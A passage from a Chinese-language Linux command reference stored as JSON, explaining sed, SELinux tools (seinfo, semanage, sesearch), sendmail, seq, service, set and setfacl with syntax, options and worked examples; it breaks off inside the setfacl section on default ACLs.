打印模板块的第一行。\n **q**  退出Sed。\n **b lable**  分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。\n **r file**  从file中读行。\n **t label**  if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\n **T label**  错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\n **w file**  写并追加模板块到file末尾。  \n **W file**  写并追加模板块的第一行到file末尾。  \n **!**  表示后面的命令对所有没有被选定的行发生作用。  \n **\u003d**  打印当前行号码。  \n **#**  把注释扩展到下一个换行符以前。  \n```\n\n### sed替换标记  \n\n```\n **g**  表示行内全面替换。  \n **p**  表示打印行。  \n **w**  表示把行写入一个文件。  \n **x**  表示互换模板块中的文本和缓冲区中的文本。  \n **y**  表示把一个字符翻译为另外的字符（但是不用于正则表达式）\n **\\1**  子串匹配标记\n **\u0026**  已匹配字符串标记\n```\n\n### sed元字符集  \n\n```\n **^**  匹配行开始，如：/^sed/匹配所有以sed开头的行。\n **$**  匹配行结束，如：/sed$/匹配所有以sed结尾的行。\n **.**  匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。\n **** * 匹配0个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。\n **[]**  匹配一个指定范围内的字符，如/[ss]ed/匹配sed和Sed。  \n **[^]**  匹配一个不在指定范围内的字符，如：/[^A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。\n **\\(..\\)**  匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。\n **\u0026**  保存搜索字符用来替换其他字符，如s/love/ **\u0026** /，love这成 **love** 。\n **\\\u003c**  匹配单词的开始，如:/\\\u003clove/匹配包含以love开头的单词的行。\n **\\\u003e**  匹配单词的结束，如/love\\\u003e/匹配包含以love结尾的单词的行。\n **x\\{m\\}**  重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。\n **x\\{m,\\}**  重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。\n **x\\{m,n\\}**  重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。  \n```\n\n## sed用法实例  \n\n### 替换操作：s命令  \n\n替换文本中的字符串：\n\n```\nsed \u0027s/book/books/\u0027 file\n```\n\n **-n选项** 和 **p命令** 一起使用表示只打印那些发生替换的行：\n\nsed -n \u0027s/test/TEST/p\u0027 file\n\n直接编辑文件 **选项-i** ，会匹配file文件中每一行的第一个book替换为books：\n\n```\nsed -i \u0027s/book/books/g\u0027 file\n```\n\n### 全面替换标记g  \n\n使用后缀 /g 标记会替换每一行中的所有匹配：\n\n```\nsed \u0027s/book/books/g\u0027 file\n```\n\n当需要从第N处匹配开始替换时，可以使用 /Ng：\n\n```\necho sksksksksksk | sed \u0027s/sk/SK/2g\u0027\nskSKSKSKSKSK\n\necho sksksksksksk | sed \u0027s/sk/SK/3g\u0027\nskskSKSKSKSK\n\necho sksksksksksk | sed \u0027s/sk/SK/4g\u0027\nskskskSKSKSK\n```\n\n### 定界符  \n\n以上命令中字符 / 在sed中作为定界符使用，也可以使用任意的定界符：\n\n```\nsed \u0027s:test:TEXT:g\u0027\nsed \u0027s|test|TEXT|g\u0027\n```\n\n定界符出现在样式内部时，需要进行转义：\n\n```\nsed \u0027s/\\/bin/\\/usr\\/local\\/bin/g\u0027\n```\n\n### 删除操作：d命令  \n\n删除空白行：\n\n```\nsed \u0027/^$/d\u0027 file\n```\n\n删除文件的第2行：\n\n```\nsed \u00272d\u0027 file\n```\n\n删除文件的第2行到末尾所有行：\n\n```\nsed \u00272,$d\u0027 file\n```\n\n删除文件最后一行：\n\n```\nsed \u0027$d\u0027 file\n```\n\n删除文件中所有开头是test的行：\n\n```\nsed \u0027/^test/\u0027d file\n```\n\n### 已匹配字符串标记\u0026  \n\n正则表达式 \\w\\+ 匹配每一个单词，使用 [\u0026] 替换它，\u0026 对应于之前所匹配到的单词：\n\n```\necho this is a test line | sed \u0027s/\\w\\+/[\u0026]/g\u0027\n[this] [is] [a] [test] [line]\n```\n\n所有以192.168.0.1开头的行都会被替换成它自已加localhost：\n\n```\nsed \u0027s/^192.168.0.1/\u0026localhost/\u0027 file\n192.168.0.1localhost\n```\n\n### 子串匹配标记\\1  \n\n匹配给定样式的其中一部分：\n\n```\necho this is digit 7 in a number | sed \u0027s/digit \\([0-9]\\)/\\1/\u0027\nthis is 7 in a number\n```\n\n命令中 digit 7，被替换成了 7。样式匹配到的子串是 7，\\(..\\) 用于匹配子串，对于匹配到的第一个子串就标记为  **\\1** ，依此类推匹配到的第二个结果就是  **\\2** ，例如：\n\n```\necho aaa BBB | sed \u0027s/\\([a-z]\\+\\) \\([A-Z]\\+\\)/\\2 \\1/\u0027\nBBB aaa\n```\n\nlove被标记为1，所有loveable会被替换成lovers，并打印出来：\n\n```\nsed -n \u0027s/\\(love\\)able/\\1rs/p\u0027 file\n```\n\n### 组合多个表达式  \n\n```\nsed \u0027表达式\u0027 | sed \u0027表达式\u0027\n\n等价于：\n\nsed \u0027表达式; 表达式\u0027\n```\n\n### 引用  \n\nsed表达式可以使用单引号来引用，但是如果表达式内部包含变量字符串，就需要使用双引号。\n\n```\ntest\u003dhello\necho hello WORLD | sed \"s/$test/HELLO\"\nHELLO WORLD\n```\n\n### 选定行的范围：,（逗号）  \n\n所有在模板test和check所确定的范围内的行都被打印：\n\n```\nsed -n \u0027/test/,/check/p\u0027 file\n```\n\n打印从第5行开始到第一个包含以test开始的行之间的所有行：\n\n```\nsed -n \u00275,/^test/p\u0027 file\n```\n\n对于模板test和west之间的行，每行的末尾用字符串aaa bbb替换：\n\n```\nsed \u0027/test/,/west/s/$/aaa bbb/\u0027 file\n```\n\n### 多点编辑：e命令  \n\n-e选项允许在同一行里执行多条命令：\n\n```\nsed -e \u00271,5d\u0027 -e \u0027s/test/check/\u0027 file\n```\n\n上面sed表达式的第一条命令删除1至5行，第二条命令用check替换test。命令的执行顺序对结果有影响。如果两个命令都是替换命令，那么第一个替换命令将影响第二个替换命令的结果。\n\n和 -e 等价的命令是 --expression：\n\n```\nsed --expression\u003d\u0027s/test/check/\u0027 --expression\u003d\u0027/love/d\u0027 file\n```\n\n### 从文件读入：r命令  \n\nfile里的内容被读进来，显示在与test匹配的行后面，如果匹配多行，则file的内容将显示在所有匹配行的下面：\n\n```\nsed \u0027/test/r file\u0027 filename\n```\n\n### 写入文件：w命令    \n\n在example中所有包含test的行都被写入file里：\n\n```\nsed -n \u0027/test/w file\u0027 example\n```\n\n### 追加（行下）：a\\命令  \n\n将 this is a test line 追加到 以test 开头的行后面：\n\n```\nsed \u0027/^test/a\\this is a test line\u0027 file\n```\n\n在 test.conf 文件第2行之后插入 this is a test line：\n\n```\nsed -i \u00272a\\this is a test line\u0027 test.conf\n```\n\n### 插入（行上）：i\\命令  \n\n将 this is a test line 追加到以test开头的行前面：\n\n```\nsed \u0027/^test/i\\this is a test line\u0027 file\n```\n\n在test.conf文件第5行之前插入this is a test line：\n\n```\nsed -i \u00275i\\this is a test line\u0027 test.conf\n```\n\n### 下一个：n命令  \n\n如果test被匹配，则移动到匹配行的下一行，替换这一行的aa，变为bb，并打印该行，然后继续：\n\n```\nsed \u0027/test/{ n; s/aa/bb/; }\u0027 file\n```\n\n### 变形：y命令  \n\n把1~10行内所有abcde转变为大写，注意，正则表达式元字符不能使用这个命令：\n\n```\nsed \u00271,10y/abcde/ABCDE/\u0027 file\n```\n\n### 退出：q命令  \n\n打印完第10行后，退出sed\n\n```\nsed \u002710q\u0027 file\n```\n\n### 保持和获取：h命令和G命令  \n\n在sed处理文件的时候，每一行都被保存在一个叫模式空间的临时缓冲区中，除非行被删除或者输出被取消，否则所有被处理的行都将 打印在屏幕上。接着模式空间被清空，并存入新的一行等待处理。\n\n```\nsed -e \u0027/test/h\u0027 -e \u0027$G\u0027 file\n```\n\n在这个例子里，匹配test的行被找到后，将存入模式空间，h命令将其复制并存入一个称为保持缓存区的特殊缓冲区内。第二条语句的意思是，当到达最后一行后，G命令取出保持缓冲区的行，然后把它放回模式空间中，且追加到现在已经存在于模式空间中的行的末尾。在这个例子中就是追加到最后一行。简单来说，任何包含test的行都被复制并追加到该文件的末尾。\n\n### 保持和互换：h命令和x命令  \n\n互换模式空间和保持缓冲区的内容。也就是把包含test与check的行互换：\n\n```\nsed -e \u0027/test/h\u0027 -e \u0027/check/x\u0027 file\n```\n\n### 脚本scriptfile  \n\nsed脚本是一个sed的命令清单，启动Sed时以-f选项引导脚本文件名。Sed对于脚本中输入的命令非常挑剔，在命令的末尾不能有任何空白或文本，如果在一行中有多个命令，要用分号分隔。以#开头的行为注释行，且不能跨行。\n\n```\nsed [options] -f scriptfile file(s)\n```\n\n### 打印奇数行或偶数行  \n\n方法1：\n\n```\nsed -n \u0027p;n\u0027 test.txt  #奇数行\nsed -n \u0027n;p\u0027 test.txt  #偶数行\n\n```\n\n方法2：\n\n```\nsed -n \u00271~2p\u0027 test.txt  #奇数行\nsed -n \u00272~2p\u0027 test.txt  #偶数行\n\n```\n\n### 打印匹配字符串的下一行  \n\n```\ngrep -A 1 SCC URFILE\nsed -n \u0027/SCC/{n;p}\u0027 URFILE\nawk \u0027/SCC/{getline; print}\u0027 URFILE\n\n```\n\n\n"},{"name":"seinfo","categoryId":0,"data":"seinfo\n\u003d\u003d\u003d\n\n查询SELinux的策略提供多少相关规则\n\n## 补充说明\n\n**seinfo命令** 是用来查询SELinux的策略提供多少相关规则，一个主体进程能否读取到目标文件资源的重点是在于SELinux的策略以及策略内的各项规则，然后再通过该规则的定义去处理各项目标文件的安全上下文，尤其是“类型”部分。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n### 语法  \n\n```\nseinfo（选项）\n```\n\n### 选项  \n\n```\n-A：列出SELinux的状态、规则布尔值、身份识别、角色、类型等所有信息。\n-t：列出SELinux所有类型(type)的种类。\n-r：列出SELinux所有角色(role)的种类。\n-u：列出SELinux所有身份识别(user)的种类。\n-b：列出所有规则的种类（布尔值）。\n```\n\n### 实例  \n\n列出与httpd有关的规则：\n\n```\nseinfo -b | grep httpd\n```\n\n\n"},{"name":"semanage","categoryId":0,"data":"semanage\n\u003d\u003d\u003d\n\n默认目录的安全上下文查询与修改\n\n## 补充说明\n\n**semanage命令** 是用来查询与修改SELinux默认目录的安全上下文。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n### 语法  \n\n```\nsemanage {login|user|port|interface|fcontext|translation} -l\nsemanage fcontext -{a|d|m} [-frst] file_spec\n```\n\n### 选项  \n\n```\n-l：查询。\nfcontext：主要用在安全上下文方面。\n-a：增加，你可以增加一些目录的默认安全上下文类型设置。\n-m：修改。\n-d：删除。\n```\n\n### 实例  \n\n查询一下`/var/www/html`的默认安全性本文的设置：\n\n```\nsemanage fcontext -l\nSELinux fcontext    type          Context\n....(前面省略)....\n/var/www(/.*)?      all files     system_u:object_r:httpd_sys_content_t:s0\n....(後面省略)....\n```\n\n如上面例子所示，我们可以查询的到每个目录的安全性本文！而目录的设定可以使用正则表达式去指定一个范围。那么如果我们想要增加某些自定义目录的安全性本文呢？举例来说，我想要色设置`/srv/samba`成为 `public_content_t`的类型时，应该如何设置呢？\n\n用semanage命令设置`/srv/samba`目录的默认安全性本文为`public_content_t`：\n\n```\nmkdir /srv/samba\nll -Zd /srv/samba\ndrwxr-xr-x  root root root:object_r:var_t    /srv/samba\n```\n\n如上所示，默认的情况应该是`var_t`这个咚咚的！\n\n```\nsemanage fcontext -l | grep \u0027/srv\u0027\n/srv/.*                     all files   system_u:object_r:var_t:s0\n/srv/([^/]*/)?ftp(/.*)?     all files   system_u:object_r:public_content_t:s0\n/srv/([^/]*/)?www(/.*)?     all files   system_u:object_r:httpd_sys_content_t:s0\n/srv/([^/]*/)?rsync(/.*)?   all files   system_u:object_r:public_content_t:s0\n/srv/gallery2(/.*)?         all files   system_u:object_r:httpd_sys_content_t:s0\n/srv                        directory   system_u:object_r:var_t:s0   //看这里！\n```\n\n上面则是默认的`/srv`底下的安全性本文资料，不过，并没有指定到`/srv/samba`。\n\n```\nsemanage fcontext -a -t public_content_t \"/srv/samba(/.*)?\"\nsemanage fcontext -l | grep \u0027/srv/samba\u0027\n/srv/samba(/.*)?            all files   system_u:object_r:public_content_t:s0\n```\n\n```\ncat /etc/selinux/targeted/contexts/files/file_contexts.local\n# This file is auto-generated by libsemanage\n# Please use the semanage command to make changes\n/srv/samba(/.*)?    system_u:object_r:public_content_t:s0  #写入这个档案\n\n```\n\n```\nrestorecon -Rv /srv/samba* #尝试恢复默认值\nll -Zd /srv/samba\ndrwxr-xr-x  root root system_u:object_r:public_content_t /srv/samba/  #有默认值，以后用restorecon命令来修改比较简单！\n```\n\nsemanage命令的功能很多，这里主要用到的仅有fcontext这个选项的用法而已。如上所示，你可以使用semanage来查询所有的目录默认值，也能够使用它来增加默认值的设置！\n\n\n"},{"name":"sendmail","categoryId":0,"data":"sendmail\n\u003d\u003d\u003d\n\n著名电子邮件服务器\n\n## 补充说明\n\n**sendmail命令** 是一款著名的电子邮件传送代理程序，也就是平常说的电子邮件服务器，它基于标准的简单邮件传输协议（SMTP）。\n\n### 语法  \n\n```\nsendmail(选项)\n```\n\n### 选项  \n\n```\n-bd：以守护进程方式运行指令；\n-bD：以前台运行方式运行；\n-bi：初始化别名数据库；\n-bm：以常规发送电子邮件；\n-bp：显示邮件的发送队列；\n-C：指定配置文件；\n-D：将调试的输出信息保存到日志文件，而不显示在标准输出设备上；\n-F：指定邮件发送者全名；\n-n：禁止使用邮件别名功能；\n-f：指定发件人的名字；\n-q：设置处理邮件队列中邮件的时间间隔。\n```\n\n\n"},{"name":"seq","categoryId":0,"data":"seq\n\u003d\u003d\u003d\n\n以指定增量从首数开始打印数字到尾数\n\n## 补充说明\n\n**seq命令** 用于产生从某个数到另外一个数之间的所有整数。\n\n### 语法  \n\n```\nseq [选项]... 尾数\nseq [选项]... 首数 尾数\nseq [选项]... 首数 增量 尾数\n```\n\n### 选项  \n\n```\n-f, --format\u003d格式        使用printf 样式的浮点格式\n-s, --separator\u003d字符串   使用指定字符串分隔数字（默认使用：\\n）\n-w, --equal-width        在列前添加0 使得宽度相同\n```\n\n### 实例  \n\n **-f选项：指定格式** \n\n```\n#seq -f\"%3g\" 9 11\n9\n10\n11\n```\n\n`%`后面指定数字的位数 默认是`%g`，`%3g`那么数字位数不足部分是空格。\n\n```\n#sed -f\"%03g\" 9 11\n#seq -f\"str%03g\" 9 11\nstr009\nstr010\nstr011\n```\n\n这样的话数字位数不足部分是0，`%`前面制定字符串。\n\n **-w选项：指定输出数字同宽** \n\n```\nseq -w 98 101\n098\n099\n100\n101\n```\n\n不能和`-f`一起用，输出是同宽的。\n\n **-s选项：指定分隔符（默认是回车）** \n\n```\nseq -s\" \" -f\"str%03g\" 9 11\nstr009 str010 str011\n```\n\n要指定`/t`做为分隔符号：\n\n```\nseq -s\"`echo -e \"/t\"`\" 9 11\n```\n\n指定`\\n`作为分隔符号：\n\n```\nseq -s\"`echo -e \"\\n\"`\" 9 11\n19293949596979899910911\n```\n\n得到的是个错误结果，不过一般也没有这个必要，它默认的就是回车作为分隔符。\n\n\n"},{"name":"service","categoryId":0,"data":"service\n\u003d\u003d\u003d\n\n控制系统服务的实用工具\n\n## 补充说明\n\n**service命令** 是Redhat Linux兼容的发行版中用来控制系统服务的实用工具，它以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。\n\n### 语法  \n\n```\nservice(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n--status-all：显示所服务的状态。\n```\n\n### 参数  \n\n*   服务名：自动要控制的服务名，即`/etc/init.d`目录下的脚本文件名；\n*   控制命令：系统服务脚本支持的控制命令。\n\n### 实例  \n\n当修改了主机名、ip地址等信息时，经常需要把网络重启使之生效。\n\n```\nservice network status\n配置设备：\nlo eth0\n当前的活跃设备：\nlo eth0\n\nservice network restart\n正在关闭接口 eth0：                                        [  确定  ]\n关闭环回接口：                                             [  确定  ]\n设置网络参数：                                             [  确定  ]\n弹出环回接口：                                             [  确定  ]\n弹出界面 eth0：                                            [  确定  ]\n```\n\n重启mysql\n\n```\nservice mysqld status\nmysqld (pid 1638) 正在运行...\n\nservice mysqld restart\n停止 MySQL：                                               [  确定  ]\n启动 MySQL：                                               [  确定  ]\n```\n\n\n"},{"name":"sesearch","categoryId":0,"data":"sesearch\n\u003d\u003d\u003d\n\n查询SELinux策略的规则详情\n\n## 补充说明\n\n使用seinfo命令可以查询SELinux的策略提供多少相关规则，如果查到的相关类型或者布尔值，想要知道详细规则时，使用 **sesearch命令** 查询。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n### 语法  \n\n```\nsesearch [-a] [-s 主体类型] [-t 目标类型] [-b 布尔值]\n```\n\n### 选项  \n\n```\n-a:列出该类型或布尔值的所有相关信息\n-t:后面还要接类型，例如 -t httpd_t\n-b:后面还要接布尔值的规则，例如 -b httpd_enable_ftp_server\n```\n\n### 实例  \n\n找出目标文件资源类型为`httpd_sys_content_t`的有关信息：\n\n```\nsesearch -a -t httpd_sys_content_t\n```\n\n找出主体进程为`httpd_t`且目标文件类型为httpd相关的所有信息：\n\n```\nsesearch -s httpd_t -t httpd_* -a\n```\n\n查看布尔值`httpd_enable_homedirs`设置了多少规则\n\n```\nsesearch -b httpd_enable_homedirs -a\n```\n\n\n"},{"name":"set","categoryId":4,"data":"set\n\u003d\u003d\u003d\n\n显示或设置shell特性及shell变量\n\n## 补充说明\n\n**set命令** 作用主要是显示系统中已经存在的shell变量，以及设置shell变量的新变量值。使用set更改shell特性时，符号\"+\"和\"-\"的作用分别是打开和关闭指定的模式。set命令不能够定义新的shell变量。如果要定义新的变量，可以使用declare命令以`变量名\u003d值`的格式进行定义即可。\n\n### 语法  \n\n```\nset(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：标示已修改的变量，以供输出至环境变量。\n-b：使被中止的后台程序立刻回报执行状态。\n-C：转向所产生的文件无法覆盖已存在的文件。\n-d：Shell预设会用杂凑表记忆使用过的指令，以加速指令的执行。使用-d参数可取消。\n-e：若指令传回值不等于0，则立即退出shell。\n-f：取消使用通配符。\n-h：自动记录函数的所在位置。\n-H Shell：可利用\"!\"加\u003c指令编号\u003e的方式来执行history中记录的指令。\n-k：指令所给的参数都会被视为此指令的环境变量。\n-l：记录for循环的变量名称。\n-m：使用监视模式。\n-n：只读取指令，而不实际执行。\n-p：启动优先顺序模式。\n-P：启动-P参数后，执行指令时，会以实际的文件或目录来取代符号连接。\n-t：执行完随后的指令，即退出shell。\n-u：当执行时使用到未定义过的变量，则显示错误信息。\n-v：显示shell所读取的输入值。\n-x：执行指令后，会先显示该指令及所下的参数。\n```\n\n### 参数  \n\n取消某个set曾启动的参数。\n\n### 实例  \n\n使用declare命令定义一个新的环境变量\"mylove\"，并且将其值设置为\"Visual C++\"，输入如下命令：\n\n```\ndeclare mylove\u003d\u0027Visual C++\u0027   #定义新环境变量\n```\n\n再使用set命令将新定义的变量输出为环境变量，输入如下命令：\n\n```\nset -a mylove                 #设置为环境变量\n```\n\n执行该命令后，将会新添加对应的环境变量。用户可以使用env命令和grep命令分别显示和搜索环境变量\"mylove\"，输入命令如下：\n\n```\nenv | grep mylove             #显示环境变量值\n```\n\n此时，该命令执行后，将输出查询到的环境变量值。\n\n\n"},{"name":"setfacl","categoryId":0,"data":"setfacl\n\u003d\u003d\u003d\n\n设置文件访问控制列表\n\n## 补充说明\n\n**setfacl命令** 是用来在命令行里设置ACL（访问控制列表）。在命令行里，一系列的命令跟随以一系列的文件名。\n\n### 选项  \n\n```\n-b,--remove-all：删除所有扩展的acl规则，基本的acl规则(所有者，群组，其他）将被保留。\n-k,--remove-default：删除缺省的acl规则。如果没有缺省规则，将不提示。\n-n，--no-mask：不要重新计算有效权限。setfacl默认会重新计算ACL mask，除非mask被明确的制定。\n--mask：重新计算有效权限，即使ACL mask被明确指定。\n-d，--default：设定默认的acl规则。\n--restore\u003dfile：从文件恢复备份的acl规则（这些文件可由getfacl -R产生）。通过这种机制可以恢复整个目录树的acl规则。此参数不能和除--test以外的任何参数一同执行。\n--test：测试模式，不会改变任何文件的acl规则，操作后的acl规格将被列出。\n-R，--recursive：递归的对所有文件及目录进行操作。\n-L，--logical：跟踪符号链接，默认情况下只跟踪符号链接文件，跳过符号链接目录。\n-P，--physical：跳过所有符号链接，包括符号链接文件。\n--version：输出setfacl的版本号并退出。\n--help：输出帮助信息。\n--：标识命令行参数结束，其后的所有参数都将被认为是文件名\n-：如果文件名是-，则setfacl将从标准输入读取文件名。\n\n```\n\n*   选项`-m`和`-x`后边跟以acl规则。多条acl规则以逗号(,)隔开。选项`-M`和`-X`用来从文件或标准输入读取acl规则。\n*   选项`--set`和`--set-file`用来设置文件或目录的acl规则，先前的设定将被覆盖。\n*   选项`-m(--modify)`和`-M(--modify-file)`选项修改文件或目录的acl规则。\n*   选项`-x(--remove)`和`-X(--remove-file)`选项删除acl规则。\n\n当使用-M，-X选项从文件中读取规则时，setfacl接受getfacl命令输出的格式。每行至少一条规则，以#开始的行将被视为注释。\n\n当在不支持ACLs的文件系统上使用setfacl命令时，setfacl将修改文件权限位。如果acl规则并不完全匹配文件权限位，setfacl将会修改文件权限位使其尽可能的反应acl规则，并会向standard error发送错误消息，以大于0的状态返回。\n\n **权限** \n\n文件的所有者以及有`CAP_FOWNER`的用户进程可以设置一个文件的acl。（在目前的linux系统上，root用户是唯一有`CAP_FOWNER`能力的用户）\n\n **ACL规则** \n\nsetfacl命令可以识别以下的规则格式：\n\n```\n[d[efault]:] [u[ser]:]uid [:perms]  指定用户的权限，文件所有者的权限（如果uid没有指定）。\n[d[efault]:] g[roup]:gid [:perms]   指定群组的权限，文件所有群组的权限（如果gid未指定）\n[d[efault]:] m[ask][:] [:perms]     有效权限掩码\n[d[efault]:] o[ther] [:perms]       其他的权限\n```\n\n恰当的acl规则被用在修改和设定的操作中，对于uid和gid，可以指定一个数字，也可指定一个名字。perms域是一个代表各种权限的字母的组合：读`-r`写`-w`执行`-x`，执行只适合目录和一些可执行的文件。pers域也可设置为八进制格式。\n\n **自动创建的规则** \n\n最初的，文件目录仅包含3个基本的acl规则。为了使规则能正常执行，需要满足以下规则。\n\n*   3个基本规则不能被删除。\n*   任何一条包含指定的用户名或群组名的规则必须包含有效的权限组合。\n*   任何一条包含缺省规则的规则在使用时，缺省规则必须存在。\n\n **ACL的名词定义** \n\n先来看看在ACL里面每一个名词的定义，这些名词我大多从man page上摘下来虽然有些枯燥,但是对于理解下面的内容还是很有帮助的。\n\nACL是由一系列的Access Entry所组成的，每一条Access Entry定义了特定的类别可以对文件拥有的操作权限。Access Entry有三个组成部分：Entry tag type, qualifier (optional), permission。\n\n我们先来看一下最重要的Entry tag type，它有以下几个类型：\n\n```\nACL_USER_OBJ：相当于Linux里file_owner的permission\nACL_USER：定义了额外的用户可以对此文件拥有的permission\nACL_GROUP_OBJ：相当于Linux里group的permission\nACL_GROUP：定义了额外的组可以对此文件拥有的permission\nACL_MASK：定义了ACL_USER, ACL_GROUP_OBJ和ACL_GROUP的最大权限 (这个我下面还会专门讨论)\nACL_OTHER：相当于Linux里other的permission\n```\n\n让我们来据个例子说明一下，下面我们就用getfacl命令来查看一个定义好了的ACL文件：\n\n```\n[root@localhost ~]# getfacl ./test.txt\n# file: test.txt\n# owner: root\n# group: admin\nuser::rw-\nuser:john:rw-\ngroup::rw-\ngroup:dev:r--\nmask::rw- other::r--\n```\n\n前面三个以#开头的定义了文件名，file owner和group。这些信息没有太大的作用，接下来我们可以用`--omit-header`来省略掉。\n\n```\nuser::rw-       定义了ACL_USER_OBJ, 说明file owner拥有read and write permission\nuser:john:rw-   定义了ACL_USER,这样用户john就拥有了对文件的读写权限,实现了我们一开始要达到的目的\ngroup::rw-      定义了ACL_GROUP_OBJ,说明文件的group拥有read and write permission\ngroup:dev:r--   定义了ACL_GROUP,使得dev组拥有了对文件的read permission\nmask::rw-       定义了ACL_MASK的权限为read and write\nother::r--      定义了ACL_OTHER的权限为read\n```\n\n从这里我们就可以看出ACL提供了我们可以定义特定用户和用户组的功能，那么接下来我们就来看一下如何设置一个文件的ACL：\n\n **如何设置ACL文件** \n\n首先我们还是要讲一下设置ACL文件的格式，从上面的例子中我们可以看到每一个Access Entry都是由三个被：号分隔开的字段所组成，第一个就是Entry tag type。\n\n```\nuser   对应了ACL_USER_OBJ和ACL_USER\ngroup  对应了ACL_GROUP_OBJ和ACL_GROUP\nmask   对应了ACL_MASK\nother  对应了ACL_OTHER\n```\n\n第二个字段称之为qualifier，也就是上面例子中的john和dev组，它定义了特定用户和拥护组对于文件的权限。这里我们也可以发现只有user和group才有qualifier，其他的都为空。第三个字段就是我们熟悉的permission了。它和Linux的permission一样定义，这里就不多讲了。\n\n下面我们就来看一下怎么设置test.txt这个文件的ACL让它来达到我们上面的要求。\n\n一开始文件没有ACL的额外属性：\n\n```\n[root@localhost ~]# ls -l\n-rw-rw-r-- 1 root admin 0 Jul 3 22:06 test.txt\n\n[root@localhost ~]# getfacl --omit-header ./test.txt\nuser::rw- group::rw- other::r--\n```\n\n我们先让用户john拥有对test.txt文件的读写权限：\n\n```\n[root@localhost ~]# setfacl -m user:john:rw- ./test.txt\n[root@localhost ~]# getfacl --omit-header ./test.txt\nuser::rw-\nuser:john:rw-\ngroup::rw-\nmask::rw-\nother::r--\n```\n\n这时我们就可以看到john用户在ACL里面已经拥有了对文件的读写权。这个时候如果我们查看一下linux的permission我们还会发现一个不一样的地方。\n\n```\n[root@localhost ~]# ls -l ./test.txt\n-rw-rw-r--+ 1 root admin 0 Jul 3 22:06 ./test.txt\n```\n\n在文件permission的最后多了一个+号，当任何一个文件拥有了ACL_USER或者ACL_GROUP的值以后我们就可以称它为ACL文件，这个+号就是用来提示我们的。我们还可以发现当一个文件拥有了`ACL_USER`或者`ACL_GROUP`的值时`ACL_MASK`同时也会被定义。\n\n接下来我们来设置dev组拥有read permission：\n\n```\n[root@localhost ~]# setfacl -m group:dev:r-- ./test.txt\n[root@localhost ~]# getfacl --omit-header ./test.txt\nuser::rw-\nuser:john:rw-\ngroup::rw-\ngroup:dev:r--\nmask::rw-\nother::r--\n```\n\n到这里就完成了我们上面讲到的要求，是不是很简单呢。\n\n **ACL_MASK和Effective permission** \n\n这里需要重点讲一下`ACL_MASK`，因为这是掌握ACL的另一个关键，在Linux file permission里面大家都知道比如对于`rw-rw-r--`来说, 当中的那个`rw-`是指文件组的permission. 但是在ACL里面这种情况只是在`ACL_MASK`不存在的情况下成立。如果文件有ACL_MASK值，那么当中那个`rw-`代表的就是mask值而不再是group permission了。\n\n让我们来看下面这个例子：\n\n```\n[root@localhost ~]# ls -l\n-rwxrw-r-- 1 root admin 0 Jul 3 23:10 test.sh\n```\n\n这里说明test.sh文件只有file owner: root拥有read, write, execute/search permission。admin组只有read and write permission，现在我们想让用户john也对test.sh具有和root一样的permission。\n\n```\n[root@localhost ~]# setfacl -m user:john:rwx ./test.sh\n[root@localhost ~]# getfacl --omit-header ./test.sh\nuser::rwx user:john:rwx\ngroup::rw-\nmask::rwx\nother::r--\n```\n\n这里我们看到john已经拥有了rwx的permission，mask值也被设定为rwx，那是因为它规定了`ACL_USER`，`ACL_GROUP`和`ACL_GROUP_OBJ`的最大值，现在我们再来看test.sh的Linux permission，它已经变成了：\n\n```\n[root@localhost ~]# ls -l\n-rwxrwxr--+ 1 root admin 0 Jul 3 23:10 test.sh\n```\n\n那么如果现在admin组的用户想要执行test.sh的程序会发生什么情况呢？它会被permission deny。原因在于实际上admin组的用户只有read and write permission，这里当中显示的rwx是`ACL_MASK`的值而不是group的permission。\n\n所以从这里我们就可以知道，如果一个文件后面有+标记，我们都需要用getfacl来确认它的permission，以免发生混淆。\n\n下面我们再来继续看一个例子，假如现在我们设置test.sh的mask为read only，那么admin组的用户还会有write permission吗？\n\n```\n[root@localhost ~]# setfacl -m mask::r-- ./test.sh\n[root@localhost ~]# getfacl --omit-header ./test.sh\nuser::rwx\nuser:john:rwx   #effective:r--\ngroup::rw-      #effective:r--\nmask::r--\nother::r--\n```\n\n这时候我们可以看到ACL_USER和ACL_GROUP_OBJ旁边多了个#effective:r--，这是什么意思呢？让我们再来回顾一下`ACL_MASK`的定义。它规定了`ACL_USER`，`ACL_GROUP_OBJ`和`ACL_GROUP`的最大权限。那么在我们这个例子中他们的最大权限也就是read only。虽然我们这里给`ACL_USER`和`ACL_GROUP_OBJ`设置了其他权限，但是他们真正有效果的只有read权限。\n\n这时我们再来查看test.sh的Linux file permission时它的group permission也会显示其mask的值(i.e. r--)\n\n```\n[root@localhost ~]# ls -l\n-rwxr--r--+ 1 root admin 0 Jul 3 23:10 test.sh\n```\n\n **Default ACL** \n\n上面我们所有讲的都是Access ACL，也就是对文件而言。下面我简单讲一下Default ACL。Default ACL是指对于一个目录进行Default ACL设置，并且在此目录下建立的文件都将继承此目录的ACL。\n\n同样我们来做一个试验说明，比如现在root用户建立了一个dir目录：\n\n```\n[root@localhost ~]# mkdir dir\n```\n\n他希望所有在此目录下建立的文件都可以被john用户所访问，那么我们就应该对dir目录设置Default ACL。\n\n```\n[root@localhost ~]# setfacl -d -m user:john:rw ./dir\n[root@localhost ~]# getfacl --omit-header ./dir\nuser::rwx\ngroup::rwx\nother::r-x\ndefault:user::rwx\ndefault:user:john:rwx\ndefault:group::rwx\ndefault:mask::rwx\ndefault: 